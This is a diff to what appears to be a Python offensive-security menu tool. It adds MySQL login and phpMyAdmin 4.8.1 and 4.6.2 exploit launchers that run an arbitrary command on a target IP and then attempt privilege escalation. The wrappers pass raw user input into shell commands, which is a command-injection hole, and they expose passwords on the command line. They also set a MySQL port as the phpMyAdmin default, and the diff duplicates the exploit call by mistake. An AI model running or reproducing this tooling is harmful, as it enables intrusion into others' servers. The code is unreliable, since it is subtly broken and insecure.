@@ -1,4 +1,5 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python
+# https://github.com/jamieduk/Cyber-Menu
 #
 # (c) J~Net 2024
 #
@@ -145,8 +146,17 @@ def mysql_brute_force_with_lists():
 # MySQL Privilege Escalation function
 def mysql_privilege_escalation():
     try:
-        print("Running MySQL Privilege Escalation... (Add your specific attack logic here)")
-        os.system("mysql -u root -p")
+        target_ip=input("Enter Target IP address: ")
+        port=input("Enter MySQL port (leave empty for default 3306): ")
+        port=port if port else '3306'  # Use default port if none provided
+        
+        # Prompt for username and password
+        user=input("Enter MySQL username: ")
+        password=input("Enter MySQL password: ")
+
+        # Connect to MySQL with provided details
+        print(f"Connecting to MySQL on {target_ip}:{port} with user {user}...")
+        os.system(f"mysql -h {target_ip} -P {port} -u {user} -p{password}")
     except Exception as e:
         print(f"An error occurred: {e}")
     finally:
@@ -206,27 +216,37 @@ def execute_phpmyadmin_exploit():
 # Function to run phpmyadmin-4.8.1-exploit.py
 def run_phpmyadmin_481_exploit():
     ipaddr=input("Enter Target IP address: ")
-    port=input("Enter Target port: ")
+    port=input("Enter Target port (leave empty for default 3306): ")
+    port=port if port else '3306'  # Use default port if none provided
+    
     path=input("Enter PHPMyAdmin path: ")
     username=input("Enter username: ")
     password=input("Enter password: ")
     command=input("Enter command to execute (e.g., whoami): ")
 
     # Running the exploit with provided inputs
-    os.system(f"python3 phpmyadmin-481-exploit.py {ipaddr} {port} {path} {username} {password} {command}")
+    os.system(f"python phpmyadmin-481-exploit.py {ipaddr} {port} {path} {username} {password} {command}")
     privilege_escalation()
+
 
 # Function to run phpMyAdmin 4.6.2-exploit.py
 def run_phpmyadmin_462_exploit():
     ipaddr=input("Enter Target IP address: ")
-    port=input("Enter Target port: ")
+    port=input("Enter Target port (leave empty for default 3306): ")
+    port=port if port else '3306'  # Use default port if none provided
+    
     path=input("Enter PHPMyAdmin path: ")
     username=input("Enter username: ")
     password=input("Enter password: ")
     command=input("Enter command to execute (e.g., whoami): ")
 
     # Running the exploit with provided inputs
-    os.system(f"python3 phpMyAdmin_4.6.2_exploit.py {ipaddr} {port} {path} {username} {password} {command}")
+    os.system(f"python phpMyAdmin_4.6.2_exploit.py {ipaddr} {port} {path} {username} {password} {command}")
+    privilege_escalation()
+
+
+    # Running the exploit with provided inputs
+    os.system(f"python phpMyAdmin_4.6.2_exploit.py {ipaddr} {port} {path} {username} {password} {command}")
     privilege_escalation()
 
 # Install required tools function
@@ -255,4 +275,3 @@ def sql_injection():
 if __name__ == "__main__":
     ethical_use_agreement()
     main_menu()
-
